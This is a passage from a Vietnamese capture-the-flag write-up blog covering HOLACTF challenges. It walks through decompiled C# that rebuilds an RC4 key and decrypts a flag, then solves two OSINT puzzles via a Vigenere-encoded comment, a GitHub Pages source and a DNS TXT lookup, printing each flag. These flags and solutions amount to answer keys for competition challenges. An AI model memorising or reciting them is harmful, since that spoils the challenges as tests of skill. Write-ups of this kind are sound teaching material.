class="line">		<span class="keyword">if</span> (!@string.StartsWith(<span class="string">&quot;HOLACTF&#123;&quot;</span>))</span><br><span class="line">		&#123;</span><br><span class="line">			<span class="keyword">throw</span> <span class="keyword">new</span> InvalidOperationException(<span class="string">&quot;Data integrity validation failed&quot;</span>);</span><br><span class="line">		&#125;</span><br><span class="line">		text = @string;</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">catch</span></span><br><span class="line">	&#123;</span><br><span class="line">		text = NetworkConfigurationManager.GetFallbackResponse();</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">return</span> text;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<ul>
<li>T·∫°i ƒë√¢y n√≥ sec call <code>ProcessDataWithCipher(cipher, key)</code> ƒë·ªÉ gi·∫£i m√£ v√† check xem output c√≥ b·∫Øt ƒë·∫ßu b·∫±ng format flag hay kh√¥ng n·∫øu b·∫Øt ƒë·∫ßu b·∫±ng <strong><em>HOLACTF{}</em></strong> th√¨ return v·ªÅ chu·ªói ƒë√≥ v√† print ra m√†n h√¨nh.</li>
<li>M√¨nh ƒë√£ c√≥ cipher v√† key s·∫Ω ƒë∆∞·ª£c gen th√¥ng qua h√†m <code>ReconstructCipherKey()</code>.</li>
</ul>
<figure class="highlight csharp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line">  		<span class="function"><span class="keyword">private</span> <span class="keyword">static</span> <span class="built_in">byte</span>[] <span class="title">ReconstructCipherKey</span>()</span></span><br><span class="line">&#123;</span><br><span class="line">	<span class="built_in">byte</span>[] array = <span class="keyword">new</span> <span class="built_in">byte</span>[NetworkConfigurationManager.g_bSecurityToken1.Length + NetworkConfigurationManager.g_bSecurityToken2.Length];</span><br><span class="line">	<span class="keyword">for</span> (<span class="built_in">int</span> i = <span class="number">0</span>; i &lt; NetworkConfigurationManager.g_bSecurityToken1.Length; i++)</span><br><span class="line">	&#123;</span><br><span class="line">		array[i] = NetworkConfigurationManager.g_bSecurityToken1[i] ^ NetworkConfigurationManager.g_bSystemIdentifier1[i % NetworkConfigurationManager.g_bSystemIdentifier1.Length];</span><br><span class="line">		array[i] = (<span class="built_in">byte</span>)((<span class="built_in">int</span>)array[i] ^ NetworkConfigurationManager.g_dwHashSalt1);</span><br><span class="line">		<span class="built_in">byte</span>[] array2 = array;</span><br><span class="line">		<span class="built_in">int</span> num = i;</span><br><span class="line">		array2[num] ^= NetworkConfigurationManager.g_bSystemIdentifier1[i % NetworkConfigurationManager.g_bSystemIdentifier1.Length];</span><br><span class="line">		array[i] = (<span class="built_in">byte</span>)((<span class="built_in">int</span>)array[i] ^ NetworkConfigurationManager.g_dwHashSalt1);</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">for</span> (<span class="built_in">int</span> i = <span class="number">0</span>; i &lt; NetworkConfigurationManager.g_bSecurityToken2.Length; i++)</span><br><span class="line">	&#123;</span><br><span class="line">		array[NetworkConfigurationManager.g_bSecurityToken1.Length + i] = NetworkConfigurationManager.g_bSecurityToken2[i] ^ NetworkConfigurationManager.g_bSystemIdentifier2[i % NetworkConfigurationManager.g_bSystemIdentifier2.Length];</span><br><span class="line">		array[NetworkConfigurationManager.g_bSecurityToken1.Length + i] = (<span class="built_in">byte</span>)((<span class="built_in">int</span>)array[NetworkConfigurationManager.g_bSecurityToken1.Length + i] ^ NetworkConfigurationManager.g_dwHashSalt2);</span><br><span class="line">		<span class="built_in">byte</span>[] array3 = array;</span><br><span class="line">		<span class="built_in">int</span> num2 = NetworkConfigurationManager.g_bSecurityToken1.Length + i;</span><br><span class="line">		array3[num2] ^= NetworkConfigurationManager.g_bSystemIdentifier2[i % NetworkConfigurationManager.g_bSystemIdentifier2.Length];</span><br><span class="line">		array[NetworkConfigurationManager.g_bSecurityToken1.Length + i] = (<span class="built_in">byte</span>)((<span class="built_in">int</span>)array[NetworkConfigurationManager.g_bSecurityToken1.Length + i] ^ NetworkConfigurationManager.g_dwHashSalt2);</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">return</span> array;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<ul>
<li>ƒê√¢y l√† h√†m gen key nh√¨n n√≥ r·∫•t d√†i d√≤ng nh∆∞ng th·∫≠t ra n√≥ ch·∫£ thay ƒë·ªïi g√¨ v√† <strong><em><code>key =  g_bSecurityToken1 + g_bSecurityToken2</code></em></strong></li>
<li>V·∫≠y m√¨nh ƒë√£ c√≥ ƒë·ªß key v√† cipher. Thu·∫≠t to√°n ·ªü ƒë√¢y l√† g√¨ ?</li>
</ul>
<figure class="highlight csharp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">private</span> <span class="keyword">static</span> <span class="built_in">byte</span>[] <span class="title">ProcessDataWithCipher</span>(<span class="params"><span class="built_in">byte</span>[] inputData, <span class="built_in">byte</span>[] cipherKey</span>)</span></span><br><span class="line">		&#123;</span><br><span class="line">			<span class="built_in">byte</span>[] array = <span class="keyword">new</span> <span class="built_in">byte</span>[<span class="number">256</span>];</span><br><span class="line">			<span class="keyword">for</span> (<span class="built_in">int</span> i = <span class="number">0</span>; i &lt; <span class="number">256</span>; i++)</span><br><span class="line">			&#123;</span><br><span class="line">				array[i] = (<span class="built_in">byte</span>)i;</span><br><span class="line">			&#125;</span><br><span class="line">			<span class="built_in">int</span> num = <span class="number">0</span>;</span><br><span class="line">			<span class="keyword">for</span> (<span class="built_in">int</span> i = <span class="number">0</span>; i &lt; <span class="number">256</span>; i++)</span><br><span class="line">			&#123;</span><br><span class="line">				num = (num + (<span class="built_in">int</span>)array[i] + (<span class="built_in">int</span>)cipherKey[i % cipherKey.Length]) % <span class="number">256</span>;</span><br><span class="line">				<span class="built_in">byte</span> b = array[i];</span><br><span class="line">				array[i] = array[num];</span><br><span class="line">				array[num] = b;</span><br><span class="line">			&#125;</span><br><span class="line">			<span class="built_in">byte</span>[] array2 = <span class="keyword">new</span> <span class="built_in">byte</span>[inputData.Length];</span><br><span class="line">			<span class="built_in">int</span> num2 = <span class="number">0</span>;</span><br><span class="line">			<span class="built_in">int</span> num3 = <span class="number">0</span>;</span><br><span class="line">			<span class="keyword">for</span> (<span class="built_in">int</span> i = <span class="number">0</span>; i &lt; inputData.Length; i++)</span><br><span class="line">			&#123;</span><br><span class="line">				num2 = (num2 + <span class="number">1</span>) % <span class="number">256</span>;</span><br><span class="line">				num3 = (num3 + (<span class="built_in">int</span>)array[num2]) % <span class="number">256</span>;</span><br><span class="line">				<span class="built_in">byte</span> b = array[num2];</span><br><span class="line">				array[num2] = array[num3];</span><br><span class="line">				array[num3] = b;</span><br><span class="line">				array2[i] = inputData[i] ^ array[(<span class="built_in">int</span>)(array[num2] + array[num3]) % <span class="number">256</span>];</span><br><span class="line">			&#125;</span><br><span class="line">			<span class="keyword">return</span> array2;</span><br><span class="line">		&#125;</span><br></pre></td></tr></table></figure>

<ul>
<li>N√≥ ch√≠nh l√† RC4. B√¢y gi·ªù m√¨nh s·∫Ω gi·∫£i m√£ v√† l·∫•y output l√† hex.<blockquote>
<p>FLAG: <strong><em>HOLACTF{hex(output)}</em></strong></p>
</blockquote>
</li>
</ul>
<p><strong>Cipher:</strong> 87 74 2b cd f2 db a2 99 27 56 97 23 a9 48 db 06 e8 83 15 d3 78 7d 4f 5d 0b e9 33 92 41 b6 b1 68 9a 7b 1d 73 d4 6d 85 10<br><strong>Key:</strong> 5f 60 7d 76 75 7e 72 7d 7e 76<br><img src="https://hackmd.io/_uploads/rJ2cxGz5eg.png" alt="image"><br><strong>FLAG:</strong> <strong>HOLACTF{745d40e06ec4ab2f33d11cd84215f62cd4b2e2705c0428df0249db3370bbc8a3990447771481ba85}</strong></p>
<h2 id="OSINT"><a href="#OSINT" class="headerlink" title="OSINT"></a>OSINT</h2><h3 id="EHC-is-my-family"><a href="#EHC-is-my-family" class="headerlink" title="EHC is my family"></a>EHC is my family</h3><p><img src="https://hackmd.io/_uploads/Hk05zMGcge.jpg" alt="540909375_1266086991656308_5633683045114270550_n"></p>
<p>DDC -&gt; VKU<br>Flag: HOLACTF{truong_dai_hoc_cong_nghe_thong_tin_va_truyen_thong_viet_han}</p>
<h3 id="HolaCTF"><a href="#HolaCTF" class="headerlink" title="HolaCTF"></a>HolaCTF</h3><p><img src="https://hackmd.io/_uploads/Bk0IQzG9xg.jpg" alt="HOLACTF"></p>
<p>ƒê·ªÅ cho m√¨nh poster c·ªßa HOLACTF 2023, n√™n m√¨nh s·∫Ω t√¨m th√¥ng tin v·ªÅ gi·∫£i n√†y. Search facebook 1 h·ªìi th√¨ m√¨nh t√¨m ƒë∆∞·ª£c 1 comment sau d∆∞·ªõi b√†i post c·ªßa HOLACTF 2023<br><img src="https://hackmd.io/_uploads/rytpmMfqxe.png" alt="image"></p>
<p>C√≥ th·ªÉ th·∫•y r√µ ƒë√¢y l√† vigenere cipher v·ªõi key kh·∫£ thi l√† 1 trong 3 hashtag ·ªü tr√™n, m√¨nh decode v·ªõi <code>dcode.fr</code>:<br><img src="https://hackmd.io/_uploads/SyXmVzz9xl.png" alt="image"></p>
<p><a target="_blank" rel="noopener" href="https://www.instagram.com/p/DFnlEkyTgBn/">https://www.instagram.com/p/DFnlEkyTgBn/</a><br>ƒê∆∞·ªùng link tr√™n d·∫´n m√¨nh ƒë·∫øn 1 video, khi ph√°t video ƒë∆∞·ª£c t·∫ßm 2-3s th√¨ m√¨nh ƒë·ªÉ √Ω d∆∞·ªõi g√≥c ph·∫£i c·ªßa video<br><img src="https://hackmd.io/_uploads/SkKY4zM9xe.png" alt="image"><br><a target="_blank" rel="noopener" href="https://anhshidou.github.io/">https://anhshidou.github.io/</a></p>
<p>Truy c·∫≠p v√†o link github pages, ctrl u ƒë·ªÉ xem html source tr∆∞·ªõc<br><img src="https://hackmd.io/_uploads/Sk-A4ff9ge.png" alt="image"></p>
<p>Ph√°t hi·ªán 1 domain l√† <code>ctf.fumosquad-ehc.xyz</code></p>
<p>Ban ƒë·∫ßu m√¨nh th·ª≠ <code>waybackmachine</code> nh∆∞ng k ƒë∆∞·ª£c, d√πng <code>dig</code> v·ªõi parameter TXT ƒë·ªÉ l·∫•y TXT record c·ªßa domain:<br><img src="https://hackmd.io/_uploads/HysYSzMqll.png" alt="image"><br>Flag: <code>HOLACTF&#123;t01_d4_c0_g4ng_r4_d3_r0i&#125;</code></p>

        
      </div>

         
    </div>
    
     
  </div>
  
    
<nav id="article-nav">
  <a class="article-nav-btn left "
    
      href="/2025/09/17/fob%20PTITHCM%20CTF%202025/"
      title="Reverse/fob (PTITHCM 2025)"
     >
    <i class="fa-solid fa-angle-left"></i>
    <p class="title-text">
      
        Reverse/fob (PTITHCM 2025)
        
    </p>
  </a>
  <a class="article-nav-btn right "
    
      href="/2025/08/19/Korea-2025/"
      title="Hacktheon Sejong 2025 üá∞üá∑"
     >

    <p class="title-text">
      
        Hacktheon Sejong 2025 üá∞üá∑
        
    </p>
    <i class="fa-solid fa-angle-right"></i>
  </a>
</nav>


  
</article>





    </div>
    <div id="footer-wrapper">
      <footer id="footer">
  
  <div id="footer-info" class="inner">
    
    &copy; 2025 nukoneZ<br>
    Powered by <a href="https://hexo.io/" target="_blank">Hexo</a> & Theme <a target="_blank" rel="noopener" href="https://github.com/saicaca/hexo-theme-vivia">Vivia</a>
  </div>
</footer>

    </div>
    <div class="back-to-top-wrapper">
    <button id="back-to-top-btn" class="back-to-top-btn hide" onclick="topFunction()">
        <i class="fa-solid fa-angle-up"></i>
    </button>
</div>

<script>
    function topFunction() {
        window.scroll({ top: 0, behavior: 'smooth' });
    }
    let btn = document.getElementById('back-to-top-btn');
    function scrollFunction() {
        if (document.body.scrollTop > 600 || document.documentElement.scrollTop > 600) {
            btn.classList.remove('hide')
        } else {
            btn.classList.add('hide')
        }
    }
    window.onscroll = function() {
        scrollFunction();
    }
</script>

  </div>
  <script src="/js/light-dark-switch.js"></script>
</body>
</html>
